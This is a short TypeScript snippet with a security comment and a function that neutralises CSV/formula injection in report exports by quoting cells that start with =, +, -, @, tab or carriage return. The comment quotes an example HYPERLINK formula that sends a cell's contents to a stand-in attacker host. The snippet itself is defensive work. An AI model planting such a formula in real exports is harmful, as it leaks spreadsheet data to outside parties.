/**
 * docs/architecture/SECURITY.md — report exports include text ingested
 * from external, attacker-influenceable sources (article titles, via
 * whatever a monitoring query matched). A title like
 * `=HYPERLINK("http://evil.example/leak?d="&A1,"Click")` opened as a
 * cell value in Excel/LibreOffice/Numbers is treated as a live formula,
 * not text (CWE-1236 "CSV Injection") — spreadsheet apps infer formula
 * cells from a leading =, +, -, or @ regardless of the CSV/XLSX source.
 * OWASP's mitigation: prefix such values with a single quote, which
 * every spreadsheet app renders as literal text instead of evaluating it.
 */
export function sanitizeCellValue(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}
